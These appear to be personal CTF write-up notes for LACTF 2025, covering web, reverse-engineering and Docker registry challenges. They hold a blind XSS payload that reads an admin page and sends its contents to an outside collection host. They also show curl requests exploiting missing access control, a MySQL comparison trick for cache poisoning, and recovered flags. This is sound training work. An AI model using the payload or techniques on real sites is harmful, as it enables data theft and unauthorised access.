---
date: 2025-02-11
description: blind xss, web cache poisoning, mysql comparison, dockerapi
platform: LACTF 2025
categories: Web, Misc, Rev
tags:
  - web-cache-poisoning
  - xss/blind
  - flask
  - code-review
  - expressJS
  - broken-access-control
  - mysql
  - docker
duration:
---
# web 
## i spy 
bunch of inspect challenges  
- robots.txt
- sitemap.xml
- DELETE site
- `nslookup -type=TXT i-spy.chall.lac.tf`

## mavs
#xss 
blind xss protected with HttpOnly cookie
```html
<img src=x onerror="fetch('/admin').then(response=>response.text()).then(data=>{fetch('https://<hooksite>?flag='+encodeURI(data));});">
```
## chessbased
- /search?q=encodeURI()

search backend endpoint
```bash
curl -X POST "https://chessbased.chall.lac.tf/search" -H "Referer: https://chessbased.chall.lac.tf/" -d '{"q": "f4"}' -H "Content-Type: application/json"
```
```
/search POST
 referrer: frontend
 json.stringify { q: query }
 admin_cookies
 
 {q:'flag'}
{ @htmlsearch resault }
```

vulnerability: no access controls  on `/render` premium 
```js
app.get('/render', (req, res) => {
  const id = req.query.id;
  const op = lookup.get(id);
  res.send(`
    <p>${op?.name}</p>
    <p>${op?.moves}</p>
  `);
});
```
```bash
curl "https://chessbased.chall.lac.tf/render?id=flag"                       
    <p>flag</p>
    <p>lactf{t00_b4s3d_4t_ch3ss_f3_kf2}</p>
```
## Cache it to win it!
caching function keys can be cheated 
`uuid="a1afd0cd-edde-4854-8566-3090feb9c8e3"` > ` A1AFD0CDeDDE485485663090FEB9C8E3xxxx` 
```python
def normalize_uuid(uuid: str):
    uuid_l = list(uuid)
    i = 0
    for i in range(len(uuid)):
        uuid_l[i] = uuid_l[i].upper()
        if uuid_l[i] == "-":
            uuid_l.pop(i)
            uuid_l.append(" ")

    return "".join(uuid_l)

def make_cache_key():
    return f"GET_check_uuids:{normalize_uuid(request.args.get('uuid'))}"[:64]  #
```
> mysql ignores trailing whitespaces special characters when comparing checks and ignores cases 

```python
# A1AFD0CDeDDE485485663090FEB9C8E3++++ still valid 
run_query("UPDATE users SET value = value + 1 WHERE id = %s;", (user_uuid,))

res = run_query("SELECT * FROM users WHERE id = %s;", (user_uuid,))
```

[[purel]]

# Rev
## paraflag
```c
undefined4 main(void)

{
  int iVar1;
  size_t sVar2;
  size_t sVar3;
  ulong i;
  undefined4 uVar5;
  char encrypted_flag [256]; // flag is 
  char flag [256]; 
  
  printf("What do you think the flag is? ");
  fflush(stdout);
 
  fgets(flag,0x100,stdin); // is used to read a line of input from the standard input (`stdin`) and store it in `flag`.
  sVar2 = strcspn(flag,"\n"); // len until \n
  flag[sVar2] = '\0'; // replace newline with null terminator

  sVar3 = strlen(target);
  if (sVar3 == sVar2) {
    if (1 < sVar2) { // 36 
      i = 0; 
      do {
        encrypted_flag[i * 2] = flag[i];
        // l 
        encrypted_flag[i * 2 + 1] = flag[i + (sVar2 >> 1)];
        // o = e8 18 = 36%2 0+18
        //  sVAR2 >> 2 == 1 // 2 
        i = i + 1;
      } while (i < sVar2 >> 1);
    }
    encrypted_flag[sVar2] = '\0';
    printf("Paradoxified: %s\n",encrypted_flag);
    iVar1 = strcmp(target,encrypted_flag);
    if (iVar1 == 0) {
      puts("That\'s the flag! :D");
      uVar5 = 0;
    }
    else {
      puts("You got the flag wrong >:(");
      uVar5 = 0;
    }
  }
  else {
    puts("Bad length >:(");
    uVar5 = 1;
  }
  return uVar5;
}

// l_alcotsft{_tihne__ifnlfaign_igtoyt} found in ghidra
```

# Misc 
## broken_ship
docker-api dowload access fslayers 
https://broken-ships.chall.lac.tf/v2 - `docker-distribution-api-version: registry/2.0`
https://broken-ships.chall.lac.tf/v2/_catalog
https://broken-ships.chall.lac.tf/v2/rms-titanic/tags/list
https://broken-ships.chall.lac.tf/v2/rms-titanic/manifests/wreck

fetching artifacs fs layers
https://broken-ships.chall.lac.tf/v2/rms-titanic/blobs/sha256:bae434f430e461b8cff40f25e16ea1bf112609233052d0ad36c10a7ab787e81c

```json
   "fsLayers": [
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:99aa9a6fbb91b4bbe98b78d048ce283d3758feebfd7c0561c478ee2ddf23c59f"
      },
      {
         "blobSum": "sha256:529375a25a3d641351bf6e3e94cb706cda39deea9e6bdc3a8ba6940e6cc4ef65"
      },
      {
         "blobSum": "sha256:60b6ee789fd8267adc92b806b0b8777c83701b7827e6cb22c79871fde4e136b9"
      },
      {
         "blobSum": "sha256:bae434f430e461b8cff40f25e16ea1bf112609233052d0ad36c10a7ab787e81c"
      },
      {
         "blobSum": "sha256:9082f840f63805c478931364adeea30f4e350a7e2e4f55cafe4e3a3125b04624"
      }
   ],
```
flag found in one of the blobs

